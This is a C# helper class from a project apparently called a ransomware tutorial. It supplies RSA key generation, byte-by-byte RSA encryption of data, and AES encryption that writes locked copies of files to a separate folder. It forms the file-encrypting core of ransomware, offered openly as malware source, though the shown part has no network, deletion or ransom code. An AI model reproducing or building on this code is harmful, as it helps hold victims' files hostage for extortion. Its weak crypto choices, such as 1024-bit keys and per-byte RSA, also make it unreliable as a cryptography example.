using RansomwareTutorial.Models;
using System;
using System.Collections;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;

namespace RansomwareTutorial.Helpers
{
    public class CryptoHelper
    {
        #region RSA
        public static RSAKey GenerateRSAKeys()
        {
            using (var rsa = new RSACryptoServiceProvider(1024))
            {
                RSAKey rsaKey;

                try
                {
                    var publicKey = rsa.ToXmlString(false);
                    var privateKey = rsa.ToXmlString(true);
                    rsaKey = new RSAKey(privateKey, publicKey);
                }
                catch (Exception ex)
                {
                    return null;
                }
                finally
                {
                    rsa.PersistKeyInCsp = false;
                }

                return rsaKey;
            }
        }
        public static byte[] DecryptRSA(byte[] data, string key)
        {
            using (var rsa = new RSACryptoServiceProvider())
            {
                rsa.FromXmlString(key);
                return rsa.Decrypt(data, false);
            }
        }
        public static byte[] EncryptRSA(byte[] data, string key)
        {
            using (var rsa = new RSACryptoServiceProvider())
            {
                rsa.FromXmlString(key);
                return rsa.Encrypt(data, false);
            }
        }
        public static byte[] EncryptLongRSA(byte[] data, string key)
        {
            List<byte> allData = new List<byte>();

            using (var rsa = new RSACryptoServiceProvider())
            {
                rsa.FromXmlString(key);
                for (int i = 0; i < data.Length; i++)
                {
                    byte[] b = new byte[1] { data[i] };
                    var e = rsa.Encrypt(b, false);
                    allData.AddRange(e);
                }
            }

            return allData.ToArray();
        }
        public static byte[] DecryptLongRSA(byte[] data, string key)
        {
            List<byte> allData = new List<byte>();

            using (var rsa = new RSACryptoServiceProvider())
            {
                rsa.FromXmlString(key);
                for (int i = 0; i < data.Length / 128; i++)
                {

                    var b = data.Skip(128 * i).Take(128).ToArray();
                    var e = rsa.Decrypt(b, false);
                    allData.AddRange(e);
                }
            }

            return allData.ToArray();
        }
        #endregion

        #region AES
        public static AesManaged GenerateAESKey(byte[] key = null, byte[] iv = null)
        {
            AesManaged aes = new AesManaged();
            if (key == null && iv == null)
            {
                aes.GenerateKey();
                aes.GenerateIV();
            }
            else
            {
                aes.Key = key;
                aes.IV = iv;
            }

            return aes;
        }
        public static void CryptoTransformAES(ICryptoTransform encryptor, string file, byte[] fileBytes, string lockedDataLocation)
        {
            using (MemoryStream msEncrypt = new MemoryStream())
            {
                using (CryptoStream csEncrypt = new CryptoStream(msEncrypt, encryptor, CryptoStreamMode.Write))
                {
                    csEncrypt.Write(fileBytes, 0, fileBytes.Length);
                    csEncrypt.FlushFinalBlock();
                    var newLocation = Path.Combine(lockedDataLocation, Path.GetFileName(file));
                    File.WriteAllBytes(newLocation, msEncrypt.ToArray());
                }
            }
        }
        #endregion
    }
}
